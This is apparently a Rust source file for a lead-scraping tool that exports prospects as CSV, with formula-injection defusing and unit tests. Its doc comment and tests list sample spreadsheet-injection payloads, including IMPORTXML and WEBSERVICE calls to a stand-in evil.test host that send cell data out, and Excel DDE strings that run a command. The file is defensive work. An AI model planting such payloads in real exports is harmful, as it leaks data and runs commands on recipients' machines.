//! One CSV renderer for prospects, shared by the CLI export, the UI download,
//! and the `serve` download API. The column set is a contract with whatever is
//! consuming these files (spreadsheets, Sheets imports, scripts), so it lives
//! in exactly one place.

use crate::store::ProspectRow;

/// The timestamp format the original SQLite export used, kept so downstream
/// importers see the same column shape.
fn stamp(t: &chrono::DateTime<chrono::Utc>) -> String {
    t.format("%Y-%m-%d %H:%M:%S").to_string()
}

/// Column order for every prospect CSV we emit. Append-only: inserting or
/// reordering breaks importers that address columns positionally.
pub const HEADER: &[&str] = &[
    "ProspectId",
    "Name",
    "Title",
    "Company",
    "Industry",
    "Email",
    "EmailStatus",
    "Phone",
    "Website",
    "LinkedIn",
    "Location",
    "Notes",
    "EstimatedValue",
    "Source",
    "SourceKey",
    "FirstSeenUtc",
    "LastSeenUtc",
];

/// The header actually written.
pub fn header_for() -> Vec<&'static str> {
    HEADER.to_vec()
}

/// Renders prospects as CSV, header row first. Always emits the header, so an
/// empty export is still a valid file downstream tools can open.
///
/// Columns are filtered by name against [`HEADER`] rather than by index, so the
/// header row and the value rows cannot drift apart when a column is added.
pub fn prospects_csv(rows: &[ProspectRow]) -> String {
    // Rough preallocation: real rows run a couple of hundred bytes.
    let mut out = String::with_capacity(128 + rows.len() * 224);
    let header = header_for();
    write_row(&mut out, &header);
    for p in rows {
        let id = p.prospect_id.to_string();
        let ev = p.estimated_value.map(|v| v.to_string()).unwrap_or_default();
        let first_seen = stamp(&p.first_seen_utc);
        let last_seen = stamp(&p.last_seen_utc);
        let all: [&str; HEADER.len()] = [
            &id,
            &p.name,
            &p.title,
            &p.company,
            &p.industry,
            &p.email,
            &p.email_status,
            &p.phone,
            &p.website,
            &p.linkedin,
            &p.location,
            &p.notes,
            &ev,
            &p.source,
            &p.source_key,
            &first_seen,
            &last_seen,
        ];
        write_row(&mut out, &all);
    }
    out
}

/// Excel assumes the system codepage for a `.csv` unless the file opens with a
/// UTF-8 BOM, which is what turns "José" into "JosÃ©" on a double-click. Only
/// ever prepend this for files and downloads — a BOM on stdout would corrupt
/// anything downstream in a pipe.
pub const UTF8_BOM: [u8; 3] = [0xEF, 0xBB, 0xBF];

pub fn with_bom(csv: &str) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(csv.len() + UTF8_BOM.len());
    bytes.extend_from_slice(&UTF8_BOM);
    bytes.extend_from_slice(csv.as_bytes());
    bytes
}

/// Stops a scraped cell from being executed as a spreadsheet formula.
///
/// Every field in these exports came off a web page an attacker may control,
/// and Excel and Sheets treat a cell opening with `=`, `+`, `-` or `@` as code.
/// That makes a lead's name a script: `=IMPORTXML(CONCAT("https://evil/",A1))`
/// exfiltrates the row the moment the file is opened, and Excel's DDE syntax
/// can go further. CSV quoting does not help — the parser strips the quotes
/// and the formula runs anyway. A leading apostrophe is the fix: spreadsheets
/// read the rest of the cell as literal text.
///
/// Two deliberate exemptions keep real data readable, and neither can execute.
/// A field that parses as a number (`-1500`) is data. So is one with no letters
/// in it (`+1 (555) 010-9999`): reaching anything outside the cell needs a name
/// — a function, a cell reference, a sheet, a DDE target — and every one of
/// those is spelled with letters. Without one, the worst a payload can do is
/// add numbers together.
fn defuse_formula(field: &str) -> std::borrow::Cow<'_, str> {
    use std::borrow::Cow;
    // Leading whitespace and tabs are ignored by the spreadsheet, so a padded
    // payload still opens a formula.
    let probe = field.trim_start();
    if !matches!(probe.chars().next(), Some('=' | '+' | '-' | '@')) {
        return Cow::Borrowed(field);
    }
    if probe.parse::<f64>().is_ok() {
        return Cow::Borrowed(field);
    }
    // `is_alphabetic`, not ASCII-only, so a localized or full-width function
    // name counts too.
    if !probe.chars().any(char::is_alphabetic) {
        return Cow::Borrowed(field);
    }
    Cow::Owned(format!("'{field}"))
}

fn write_row(out: &mut String, fields: &[&str]) {
    for (i, f) in fields.iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        let safe = defuse_formula(f);
        if safe.contains([',', '"', '\n', '\r']) {
            out.push('"');
            out.push_str(&safe.replace('"', "\"\""));
            out.push('"');
        } else {
            out.push_str(&safe);
        }
    }
    out.push('\n');
}

/// CSV of custom artifacts. Columns come from the plan's field schema (label or
/// key), plus Url / SourceKey / FirstSeen. Values are projected from FieldsJson
/// by key. Reuses the same formula-defusing and quoting as prospects.
pub fn artifacts_csv(rows: &[crate::store::ArtifactRow], schema: &[crate::artifact::FieldSpec]) -> String {
    let mut out = String::new();
    let mut header: Vec<String> =
        schema.iter().map(|f| if f.label.trim().is_empty() { f.key.clone() } else { f.label.clone() }).collect();
    header.extend(["Url".to_string(), "SourceKey".to_string(), "FirstSeen".to_string()]);
    write_row(&mut out, &header.iter().map(String::as_str).collect::<Vec<_>>());
    for r in rows {
        let mut cells: Vec<String> = schema.iter().map(|f| json_cell(&r.fields, &f.key)).collect();
        cells.push(r.url.clone());
        cells.push(r.source_key.clone());
        cells.push(r.first_seen_utc.to_rfc3339());
        write_row(&mut out, &cells.iter().map(String::as_str).collect::<Vec<_>>());
    }
    out
}

fn json_cell(fields: &serde_json::Value, key: &str) -> String {
    match fields.get(key) {
        Some(serde_json::Value::String(s)) => s.clone(),
        Some(serde_json::Value::Number(n)) => n.to_string(),
        Some(serde_json::Value::Bool(b)) => b.to_string(),
        Some(serde_json::Value::Null) | None => String::new(),
        Some(v) => v.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_export_still_has_a_header() {
        let csv = prospects_csv(&[]);
        assert_eq!(csv.lines().count(), 1);
        assert!(csv.starts_with("ProspectId,Name,Title,"));
        assert!(csv.ends_with("LastSeenUtc\n"));
    }

/// Fields in one CSV record, honouring quoted commas.
    fn count_fields(record: &str) -> usize {
        let mut fields = 1;
        let mut in_quotes = false;
        let mut chars = record.chars().peekable();
        while let Some(c) = chars.next() {
            match c {
                '"' if in_quotes && chars.peek() == Some(&'"') => {
                    chars.next();
                }
                '"' => in_quotes = !in_quotes,
                ',' if !in_quotes => fields += 1,
                _ => {}
            }
        }
        fields
    }

        fn sample_row() -> ProspectRow {
        ProspectRow {
            prospect_id: 7,
            name: "Ada, Lovelace".into(), // comma forces quoting
            title: "Head of Treasury".into(),
            company: "Bitso".into(),
            industry: "Fintech".into(),
            email: "ada.lovelace@bitso.com".into(),
            email_status: "verified".into(),
            phone: "+52 55 1234".into(),
            website: "https://bitso.com".into(),
            linkedin: "https://linkedin.com/in/ada".into(),
            location: "CDMX".into(),
            notes: "using: settles USDC payouts via Circle".into(),
            estimated_value: Some(1_500_000),
            source: "mexico_stablecoin_fintech".into(),
            source_key: "bitso.com".into(),
            plan_id: 1,
            first_seen_utc: chrono::DateTime::parse_from_rfc3339("2026-07-21T03:00:00Z").unwrap().into(),
            last_seen_utc: chrono::DateTime::parse_from_rfc3339("2026-07-22T03:00:00Z").unwrap().into(),
        }
    }

    #[test]
    fn export_includes_every_column() {
        let csv = prospects_csv(&[sample_row()]);
        let data = csv.lines().nth(1).unwrap();
        assert!(data.starts_with("7,\"Ada, Lovelace\",Head of Treasury,Bitso,"));
        assert!(data.contains("ada.lovelace@bitso.com,verified,"));
        assert!(data.contains("https://linkedin.com/in/ada"));
        assert!(data.contains("https://bitso.com"));
        assert!(data.contains("using: settles USDC payouts via Circle"));
        // A comma inside a value must stay quoted (the name, above) — that is
        // the only field that can still carry one now the prose columns are gone.
        assert!(csv.contains("1500000"));
        assert!(csv
            .trim_end()
            .ends_with("2026-07-21 03:00:00,2026-07-22 03:00:00"));
        // Header and data must stay column-aligned.
        assert_eq!(
            csv.lines().next().unwrap().split(',').count(),
            HEADER.len(),
            "header column count"
        );
    }

    #[test]
    fn the_export_shape_is_fixed() {
        // Importers address these columns positionally, so the shape may only
        // change deliberately.
        let before = prospects_csv(&[sample_row()]);
        assert_eq!(before.lines().next().unwrap(), HEADER.join(","));
    }


    #[test]
    fn csv_escaping() {
        let mut out = String::new();
        write_row(&mut out, &["a", "b,c", "d\"e"]);
        assert_eq!(out, "a,\"b,c\",\"d\"\"e\"\n");
    }

    #[test]
    fn scraped_formulas_cannot_execute_in_a_spreadsheet() {
        // The realistic payloads: exfiltration via Sheets, and Excel DDE.
        for payload in [
            "=IMPORTXML(CONCAT(\"https://evil.test/?d=\",A1),\"//a\")",
            "=HYPERLINK(\"https://evil.test\",\"click\")",
            "@SUM(A1:A9)",
            "+cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "\t=1+1+HYPERLINK(\"https://evil.test\")",
            "   =WEBSERVICE(\"https://evil.test\")",
            "=IMAGE(\"https://evil.test/track.png\")",
            "-A1&B1",
            // Full-width letters are still letters.
            "=ＳＵＭ(A1)",
        ] {
            let safe = defuse_formula(payload);
            assert!(
                safe.starts_with('\''),
                "payload must be neutralized: {payload:?} became {safe:?}"
            );
        }
    }

    #[test]
    fn real_data_is_not_mangled_by_the_formula_guard() {
        // Phone numbers and negative values are the false positives that would
        // make an export look corrupted; none of these can execute.
        for benign in [
            "+52 55 1234",
            "+1 (555) 010-9999",
            "-1500",
            "-1.5e3",
            "0",
            "Ada Lovelace",
            "ada@bitso.com",
            "https://bitso.com",
            "",
        ] {
            assert_eq!(
                defuse_formula(benign),
                benign,
                "benign field must pass through untouched"
            );
        }
    }

    #[test]
    fn a_malicious_name_is_defused_inside_a_real_export() {
        let mut row = sample_row();
        row.name = "=HYPERLINK(\"https://evil.test\",\"Ada\")".into();
        row.notes = "@SUM(1,1)".into();
        row.phone = "+52 55 1234".into();
        row.estimated_value = Some(-1500);

        let csv = prospects_csv(&[row]);
        assert!(
            csv.contains("\"'=HYPERLINK("),
            "name must be quoted and defused"
        );
        assert!(csv.contains("'@SUM(1,1)"), "notes must be defused");
        assert!(csv.contains("+52 55 1234"), "phone must stay readable");
        assert!(
            !csv.contains("'+52"),
            "phone must not be quoted as a formula"
        );
        assert!(csv.contains(",-1500,"), "negative value must stay numeric");
    }

    #[test]
    fn bom_precedes_the_header() {
        let bytes = with_bom(&prospects_csv(&[]));
        assert_eq!(&bytes[..3], &UTF8_BOM);
        assert!(bytes.ends_with(b"LastSeenUtc\n"));
    }
}
